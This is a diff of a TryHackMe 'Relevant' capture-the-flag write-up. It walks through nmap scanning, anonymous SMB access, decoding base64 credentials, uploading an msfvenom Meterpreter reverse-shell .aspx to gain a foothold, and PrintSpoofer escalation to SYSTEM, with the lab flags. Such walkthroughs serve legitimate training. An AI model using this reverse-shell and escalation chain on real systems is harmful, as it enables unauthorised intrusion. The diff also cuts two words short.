@@ -1,28 +1,15 @@
 ﻿TryHackMe: Relevant - Write-up
-
-
 Date: April 19, 2026
-
-
 Author: David Revach
-
-
 Target IP: 10.81.140.158
-
-
 Difficulty: Medium (Black Box)
 
-
-
-
 1 Service Scanning (Nmap)
-
 
 I initiated the engagement with a comprehensive Nmap scan.
 While standard ports like 80 (HTTP) and 445 (SMB) were immediately visible,
 a full 65k port sweep was necessary to uncover hidden high-order ports.
 This revealed additional HTTP services, suggesting a complex IIS configuration
-
 
 nmap -sV -sC -A -T4 10.81.140.158           
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-19 06:19 -0400
@@ -60,7 +47,6 @@ No exact OS matches for host (test conditions non-ideal).
 Network Distance: 3 hops
 Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
 
-
 Host script results:
 | smb2-security-mode: 
 |   3.1.1: 
@@ -82,8 +68,6 @@ Host script results:
 |_clock-skew: mean: 1h24m01s, deviation: 3h07m52s, median: 0s
 
 
-
-
 nmap -p- -T4 10.81.140.158
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-19 06:26 -0400
 Nmap scan report for 10.81.140.158
@@ -100,33 +84,12 @@ PORT      STATE SERVICE
 49667/tcp open  unknown
 
 
-
-
 2 SMB Reconnaissance
 
-
-2.1 Enumerating SMB shares revealed that the nt4wrksv share allowed Anonymous/Guest access. Upon connecting, I discovered a file named passwords.txt
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+2.1 Enumerating SMB shares revealed that the nt4wrksv share allowed Anonymous/Guest access. Upon connecting, I discovered a file named passwords.tx
 
 smbclient -L //10.81.140.158
 Password for [WORKGROUP\kali]:
-
 
         Sharename       Type      Comment
         ---------               ----         -------
@@ -157,15 +120,8 @@ getting file \passwords.txt of size 98 as passwords.txt (0.3 KiloBytes/sec) (ave
 
 2.3 Credential Analysis
 
-
 2.2 The passwords.txt file contained two Base64 encoded strings. 
 Decoding them yielded plaintext credentials for two users
-
-
-
-
-
-
 
 
 ┌──(kali㉿kali)-[~]
@@ -179,59 +135,21 @@ QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
 └─$ echo Qm9iIC0gIVBAJCRXMHJEITEyMw== | base64 -d
 Bob - !P@$$W0rD!123
 
-
 ┌──(kali㉿kali)-[~]
 └─$ echo QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk | base64 -d
 Bill - Juw4nnaM4n420696969!$$$
 
 
-
-
 3 Exploitation
 
-
 3.1 Web-to-SMB Directory Mapping
-
 
 A critical discovery was made: the hidden web service on port 49663 served content directly from the nt4wrksv SMB directory. 
 This provided a direct path for an "Upload-to-Execute" attack chain.
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 3.2 Gaining a Foothold (RCE)
 
-
-I generated a custom Meterpreter reverse shell payload in .aspx format and uploaded it to the writable SMB share
-
-
-
-
-
+I generated a custom Meterpreter reverse shell payload in .aspx format and uploaded it to the writable SMB shar
 
 msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.xxx.xxx lport=8910 -f aspx -o shell.aspx
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -248,8 +166,6 @@ Password for [WORKGROUP\kali]:
 Try "help" to get a list of possible commands.
 smb: \> put shell.aspx
 putting file shell.aspx as \shell.aspx (1629.4 kB/s) (average 1629.4 kB/s)
-
-
 
 
 ┌──(kali㉿kali)-[~]
@@ -276,27 +192,17 @@ msf exploit(multi/handler) > run
 meterpreter > cat C:/users/bob/desktop/user.txt
 THM{fdk4ka34vk346ksxfr21tg789ktf45}meterpreter >
 
-
-
-
 4. Privilege Escalation
 
-
 4.1 Privilege Audit
-
-
 After gaining a low-privileged shell as iis apppool\relevant, I audited the process privileges.
 The audit revealed that SeImpersonatePrivilege was enabled
 
 
-
-
 meterpreter > getprivs
-
 
 Enabled Process Privileges
 ==========================
-
 
 Name
 ----
@@ -309,11 +215,8 @@ SeIncreaseQuotaPrivilege
 SeIncreaseWorkingSetPrivilege
 
 
-
-
 ┌──(kali㉿kali)-[~]
 └─$ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
-
 
 ┌──(kali㉿kali)-[~]
 └─$ smbclient \\\\10.81.140.158\\nt4wrksv
@@ -321,7 +224,6 @@ Password for [WORKGROUP\kali]:
 Try "help" to get a list of possible commands.
 smb: \> put PrintSpoofer64.exe
 putting file PrintSpoofer64.exe as \PrintSpoofer64.exe (17.5 kb/s) (average 17.5 kb/s)
-
 
 smb: \> dir
   .                                   D        0  Sun Sep 17 21:09:03 2023
@@ -331,27 +233,21 @@ smb: \> dir
   shell.aspx                          A  1014987  Sun Sep 17 20:59:47 2023
 
 
-
-
 meterpreter > shell
 Process 2064 created.
 Channel 1 created.
 Microsoft Windows [Version 10.0.14393]
 (c) 2016 Microsoft Corporation. All rights reserved.
 
-
 c:\windows\system32\inetsrv>cd c:/inetpub/wwwroot/nt4wrksv
 cd c:/inetpub/wwwroot/nt4wrksv
-
 
 c:\inetpub\wwwroot\nt4wrksv>dir
 dir
  Volume in drive C has no label.
  Volume Serial Number is AC3C-5CB5
 
-
  Directory of c:\inetpub\wwwroot\nt4wrksv
-
 
 09/17/2023  07:29 AM    <DIR>          .
 09/17/2023  07:29 AM    <DIR>          ..
@@ -373,9 +269,7 @@ Copyright (C) 2016 Microsoft Corporation. All rights reserved.
 
 4.3 Root Compromise
 
-
 With SYSTEM privileges confirmed via whoami, I successfully retrieved the final flag from the Administrator's desktop.
-
 
 PS C:\Windows\system32> whoami
 whoami
@@ -385,25 +279,15 @@ cd \users\administrator\desktop
 PS C:\users\administrator\desktop> dir
 dir
 
-
-
-
     Directory: C:\users\administrator\desktop
-
-
-
 
 Mode                LastWriteTime         Length Name                          
 ----                -------------         ------ ----                          
 -a----        7/25/2020   8:25 AM             35 root.txt                      
 
-
-
-
 PS C:\users\administrator\desktop> cat root.txt
 cat root.txt
 THM{1fk5kf469devly1gl320zafgl345pv}
-
 
 5. Remediation Recommendations
 
